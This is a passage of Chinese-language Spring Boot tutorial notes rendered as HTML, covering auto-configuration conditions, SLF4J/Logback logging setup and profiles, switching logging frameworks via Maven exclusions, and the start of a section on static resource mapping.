class="keyword">this</span>.properties = properties;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Bean</span>   <span class="comment">//给容器中添加一个组件，这个组件的某些值需要从properties中获取</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span>(CharacterEncodingFilter<span class="class">.<span class="keyword">class</span>) //判断容器没有这个组件？</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">CharacterEncodingFilter</span> <span class="title">characterEncodingFilter</span>() </span>&#123;</span><br><span class="line">CharacterEncodingFilter filter = <span class="keyword">new</span> OrderedCharacterEncodingFilter();</span><br><span class="line">filter.setEncoding(<span class="keyword">this</span>.properties.getCharset().name());</span><br><span class="line">filter.setForceRequestEncoding(<span class="keyword">this</span>.properties.shouldForce(Type.REQUEST));</span><br><span class="line">filter.setForceResponseEncoding(<span class="keyword">this</span>.properties.shouldForce(Type.RESPONSE));</span><br><span class="line"><span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据当前不同的条件判断，决定这个配置类是否生效？</p><p>一但这个配置类生效；这个配置类就会给容器中添加各种组件；这些组件的属性是从对应的properties类中获取的，这些类里面的每一个属性又是和配置文件绑定的；</p><p>5）、所有在配置文件中能配置的属性都是在xxxxProperties类中封装者‘；配置文件能配置什么就可以参照某个功能对应的这个属性类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.http.encoding"</span>)  <span class="comment">//从配置文件中获取指定的值和bean的属性进行绑定</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpEncodingProperties</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Charset DEFAULT_CHARSET = Charset.forName(<span class="string">"UTF-8"</span>);</span><br></pre></td></tr></table></figure><p><strong>精髓：</strong></p><p>​    <strong>1）、SpringBoot启动会加载大量的自动配置类</strong></p><p>​    <strong>2）、我们看我们需要的功能有没有SpringBoot默认写好的自动配置类；</strong></p><p>​    <strong>3）、我们再来看这个自动配置类中到底配置了哪些组件；（只要我们要用的组件有，我们就不需要再来配置了）</strong></p><p>​    <strong>4）、给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们就可以在配置文件中指定这些属性的值；</strong></p><p>xxxxAutoConfigurartion：自动配置类；</p><p>给容器中添加组件</p><p>xxxxProperties:封装配置文件中相关属性；</p><h3><span id="2-细节">2、细节</span></h3><h4><span id="1-conditional派生注解spring注解版原生的conditional作用">1、@Conditional派生注解（Spring注解版原生的@Conditional作用）</span></h4><p>作用：必须是@Conditional指定的条件成立，才给容器中添加组件，配置配里面的所有内容才生效；</p><table><thead><tr><th>@Conditional扩展注解</th><th>作用（判断是否满足当前指定条件）</th></tr></thead><tbody><tr><td>@ConditionalOnJava</td><td>系统的java版本是否符合要求</td></tr><tr><td>@ConditionalOnBean</td><td>容器中存在指定Bean；</td></tr><tr><td>@ConditionalOnMissingBean</td><td>容器中不存在指定Bean；</td></tr><tr><td>@ConditionalOnExpression</td><td>满足SpEL表达式指定</td></tr><tr><td>@ConditionalOnClass</td><td>系统中有指定的类</td></tr><tr><td>@ConditionalOnMissingClass</td><td>系统中没有指定的类</td></tr><tr><td>@ConditionalOnSingleCandidate</td><td>容器中只有一个指定的Bean，或者这个Bean是首选Bean</td></tr><tr><td>@ConditionalOnProperty</td><td>系统中指定的属性是否有指定的值</td></tr><tr><td>@ConditionalOnResource</td><td>类路径下是否存在指定资源文件</td></tr><tr><td>@ConditionalOnWebApplication</td><td>当前是web环境</td></tr><tr><td>@ConditionalOnNotWebApplication</td><td>当前不是web环境</td></tr><tr><td>@ConditionalOnJndi</td><td>JNDI存在指定项</td></tr></tbody></table><p><strong>自动配置类必须在一定的条件下才能生效；</strong></p><p>我们怎么知道哪些自动配置类生效；</p><p><strong>==我们可以通过启用  debug=true属性；来让控制台打印自动配置报告==</strong>，这样我们就可以很方便的知道哪些自动配置类生效；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">=========================</span><br><span class="line">AUTO-CONFIGURATION REPORT</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Positive matches:（自动配置类启用的）</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">   DispatcherServletAutoConfiguration matched:</span><br><span class="line">      - <span class="meta">@ConditionalOnClass</span> found required <span class="class"><span class="keyword">class</span> '<span class="title">org</span>.<span class="title">springframework</span>.<span class="title">web</span>.<span class="title">servlet</span>.<span class="title">DispatcherServlet</span>'</span>; <span class="meta">@ConditionalOnMissingClass</span> <span class="function">did not find unwanted <span class="title">class</span> <span class="params">(OnClassCondition)</span></span></span><br><span class="line"><span class="function">      - @<span class="title">ConditionalOnWebApplication</span> <span class="params">(required)</span> found <span class="title">StandardServletEnvironment</span> <span class="params">(OnWebApplicationCondition)</span></span></span><br><span class="line"><span class="function">        </span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">Negative matches:（没有启动，没有匹配成功的自动配置类）</span></span><br><span class="line"><span class="function">-----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   ActiveMQAutoConfiguration:</span></span><br><span class="line"><span class="function">      Did not match:</span></span><br><span class="line"><span class="function">         - @ConditionalOnClass did not find required classes 'javax.jms.ConnectionFactory', 'org.apache.activemq.ActiveMQConnectionFactory' <span class="params">(OnClassCondition)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   AopAutoConfiguration:</span></span><br><span class="line"><span class="function">      Did not match:</span></span><br><span class="line"><span class="function">         - @ConditionalOnClass did not find required classes 'org.aspectj.lang.annotation.Aspect', 'org.aspectj.lang.reflect.Advice' <span class="params">(OnClassCondition)</span></span></span><br></pre></td></tr></table></figure><h1><span id="三-日志">三、日志</span></h1><h2><span id="1-日志框架">1、日志框架</span></h2><p> 小张；开发一个大型系统；</p><p>​        1、System.out.println(“”)；将关键数据打印在控制台；去掉？写在一个文件？</p><p>​        2、框架来记录系统的一些运行时信息；日志框架 ；  zhanglogging.jar；</p><p>​        3、高大上的几个功能？异步模式？自动归档？xxxx？  zhanglogging-good.jar？</p><p>​        4、将以前框架卸下来？换上新的框架，重新修改之前相关的API；zhanglogging-prefect.jar；</p><p>​        5、JDBC—数据库驱动；</p><p>​            写了一个统一的接口层；日志门面（日志的一个抽象层）；logging-abstract.jar；</p><p>​            给项目中导入具体的日志实现就行了；我们之前的日志框架都是实现的抽象层；</p><p><strong>市面上的日志框架；</strong></p><p>JUL、JCL、Jboss-logging、logback、log4j、log4j2、slf4j….</p><table><thead><tr><th>日志门面  （日志的抽象层）</th><th>日志实现</th></tr></thead><tbody><tr><td><del>JCL（Jakarta  Commons Logging）</del>    SLF4j（Simple  Logging Facade for Java）    <strong><del>jboss-logging</del></strong></td><td>Log4j  JUL（java.util.logging）  Log4j2  <strong>Logback</strong></td></tr></tbody></table><p>左边选一个门面（抽象层）、右边来选一个实现；</p><p>日志门面：  SLF4J；</p><p>日志实现：Logback；</p><p>SpringBoot：底层是Spring框架，Spring框架默认是用JCL；‘</p><p>​    <strong>==SpringBoot选用 SLF4j和logback；==</strong></p><h2><span id="2-slf4j使用">2、SLF4j使用</span></h2><h3><span id="1-如何在系统中使用slf4j-httpswwwslf4jorg">1、如何在系统中使用SLF4j   </span></h3><p>以后开发的时候，日志记录方法的调用，不应该来直接调用日志的实现类，而是调用日志抽象层里面的方法；</p><p>给系统里面导入slf4j的jar和  logback的实现jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Logger logger = LoggerFactory.getLogger(HelloWorld<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    logger.info(<span class="string">"Hello World"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>图示；</p><p><img src="images/concrete-bindings.png" alt></p><p>每一个日志的实现框架都有自己的配置文件。使用slf4j以后，<strong>配置文件还是做成日志实现框架自己本身的配置文件；</strong></p><h3><span id="2-遗留问题">2、遗留问题</span></h3><p>a（slf4j+logback）: Spring（commons-logging）、Hibernate（jboss-logging）、MyBatis、xxxx</p><p>统一日志记录，即使是别的框架和我一起统一使用slf4j进行输出？</p><p><img src="images/legacy.png" alt></p><p><strong>如何让系统中所有的日志都统一到slf4j；</strong></p><p>==1、将系统中其他日志框架先排除出去；==</p><p>==2、用中间包来替换原有的日志框架；==</p><p>==3、我们导入slf4j其他的实现==</p><h2><span id="3-springboot日志关系">3、SpringBoot日志关系</span></h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SpringBoot使用它来做日志功能；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>底层依赖关系</p><p><img src="images/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180131220946.png" alt></p><p>总结：</p><p>​    1）、SpringBoot底层也是使用slf4j+logback的方式进行日志记录</p><p>​    2）、SpringBoot也把其他的日志都替换成了slf4j；</p><p>​    3）、中间替换包？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"rawtypes"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">LogFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> String UNSUPPORTED_OPERATION_IN_JCL_OVER_SLF4J = <span class="string">"http://www.slf4j.org/codes.html#unsupported_operation_in_jcl_over_slf4j"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> LogFactory logFactory = <span class="keyword">new</span> SLF4JLogFactory();</span><br></pre></td></tr></table></figure><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180131221411.png" alt></p><p>​    4）、如果我们要引入其他框架？一定要把这个框架的默认日志依赖移除掉？</p><p>​            Spring框架用的是commons-logging；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>==SpringBoot能自动适配所有的日志，而且底层使用slf4j+logback的方式记录日志，引入其他框架的时候，只需要把这个框架依赖的日志框架排除掉即可；==</strong></p><h2><span id="4-日志使用">4、日志使用；</span></h2><h3><span id="1-默认配置">1、默认配置</span></h3><p>SpringBoot默认帮我们配置好了日志；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//记录器</span></span><br><span class="line">Logger logger = LoggerFactory.getLogger(getClass());</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextLoads</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//System.out.println();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//日志的级别；</span></span><br><span class="line"><span class="comment">//由低到高   trace&lt;debug&lt;info&lt;warn&lt;error</span></span><br><span class="line"><span class="comment">//可以调整输出的日志级别；日志就只会在这个级别以以后的高级别生效</span></span><br><span class="line">logger.trace(<span class="string">"这是trace日志..."</span>);</span><br><span class="line">logger.debug(<span class="string">"这是debug日志..."</span>);</span><br><span class="line"><span class="comment">//SpringBoot默认给我们使用的是info级别的，没有指定级别的就用SpringBoot默认规定的级别；root级别</span></span><br><span class="line">logger.info(<span class="string">"这是info日志..."</span>);</span><br><span class="line">logger.warn(<span class="string">"这是warn日志..."</span>);</span><br><span class="line">logger.error(<span class="string">"这是error日志..."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>日志输出格式：    %d表示日期时间，    %thread表示线程名，    %-5level：级别从左显示5个字符宽度    %logger{50} 表示logger名字最长50个字符，否则按照句点分割。     %msg：日志消息，    %n是换行符--&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n</code></pre><p>SpringBoot修改日志的默认配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">logging.level.com.atguigu</span>=<span class="string">trace</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#logging.path=</span></span><br><span class="line"><span class="comment"># 不指定路径在当前项目下生成springboot.log日志</span></span><br><span class="line"><span class="comment"># 可以指定完整的路径；</span></span><br><span class="line"><span class="comment">#logging.file=G:/springboot.log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在当前磁盘的根路径下创建spring文件夹和里面的log文件夹；使用 spring.log 作为默认文件</span></span><br><span class="line"><span class="meta">logging.path</span>=<span class="string">/spring/log</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  在控制台输出的日志的格式</span></span><br><span class="line"><span class="meta">logging.pattern.console</span>=<span class="string">%d&#123;yyyy-MM-dd&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n</span></span><br><span class="line"><span class="comment"># 指定文件中日志输出的格式</span></span><br><span class="line"><span class="meta">logging.pattern.file</span>=<span class="string">%d&#123;yyyy-MM-dd&#125; === [%thread] === %-5level === %logger&#123;50&#125; ==== %msg%n</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>logging.file</th><th>logging.path</th><th>Example</th><th>Description</th></tr></thead><tbody><tr><td>(none)</td><td>(none)</td><td></td><td>只在控制台输出</td></tr><tr><td>指定文件名</td><td>(none)</td><td>my.log</td><td>输出日志到my.log文件</td></tr><tr><td>(none)</td><td>指定目录</td><td>/var/log</td><td>输出到指定目录的 spring.log 文件中</td></tr></tbody></table><h3><span id="2-指定配置">2、指定配置</span></h3><p>给类路径下放上每个日志框架自己的配置文件即可；SpringBoot就不使用他默认配置的了</p><table><thead><tr><th>Logging System</th><th>Customization</th></tr></thead><tbody><tr><td>Logback</td><td><code>logback-spring.xml</code>, <code>logback-spring.groovy</code>, <code>logback.xml</code> or <code>logback.groovy</code></td></tr><tr><td>Log4j2</td><td><code>log4j2-spring.xml</code> or <code>log4j2.xml</code></td></tr><tr><td>JDK (Java Util Logging)</td><td><code>logging.properties</code></td></tr></tbody></table><p>logback.xml：直接就被日志框架识别了；</p><p><strong>logback-spring.xml</strong>：日志框架就不直接加载日志的配置项，由SpringBoot解析日志配置，可以使用SpringBoot的高级Profile功能</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"staging"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- configuration to be enabled when the "staging" profile is active --&gt;</span></span><br><span class="line">  可以指定某段配置只在某个环境下生效</span><br><span class="line"><span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">"stdout"</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.core.ConsoleAppender"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        日志输出格式：</span></span><br><span class="line"><span class="comment">%d表示日期时间，</span></span><br><span class="line"><span class="comment">%thread表示线程名，</span></span><br><span class="line"><span class="comment">%-5level：级别从左显示5个字符宽度</span></span><br><span class="line"><span class="comment">%logger&#123;50&#125; 表示logger名字最长50个字符，否则按照句点分割。 </span></span><br><span class="line"><span class="comment">%msg：日志消息，</span></span><br><span class="line"><span class="comment">%n是换行符</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">"ch.qos.logback.classic.PatternLayout"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"dev"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; ----&gt; [%thread] ---&gt; %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">"!dev"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; ==== [%thread] ==== %-5level %logger&#123;50&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果使用logback.xml作为日志配置文件，还要使用profile功能，会有以下错误</p><p> <code>no applicable action for [springProfile]</code></p><h2><span id="5-切换日志框架">5、切换日志框架</span></h2><p>可以按照slf4j的日志适配图，进行相关的切换；</p><p>slf4j+log4j的方式；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-log4j12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>切换为log4j2</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h1><span id="四-web开发">四、Web开发</span></h1><h2><span id="1-简介">1、简介</span></h2><p>使用SpringBoot；</p><p><strong>1）、创建SpringBoot应用，选中我们需要的模块；</strong></p><p><strong>2）、SpringBoot已经默认将这些场景配置好了，只需要在配置文件中指定少量配置就可以运行起来</strong></p><p><strong>3）、自己编写业务代码；</strong></p><p><strong>自动配置原理？</strong></p><p>这个场景SpringBoot帮我们配置了什么？能不能修改？能修改哪些配置？能不能扩展？xxx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxxxAutoConfiguration：帮我们给容器中自动配置组件；</span><br><span class="line">xxxxProperties:配置类来封装配置文件的内容；</span><br></pre></td></tr></table></figure><h2><span id="2-springboot对静态资源的映射规则">2、SpringBoot对静态资源的映射规则；</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.resources"</span>, ignoreUnknownFields = <span class="keyword">false</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceProperties</span> <span class="keyword">implements</span> <span class="title">ResourceLoaderAware</span> </span>&#123;</span><br><span class="line">  <span class="comment">//可以设置和静态资源有关的参数，缓存时间等</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 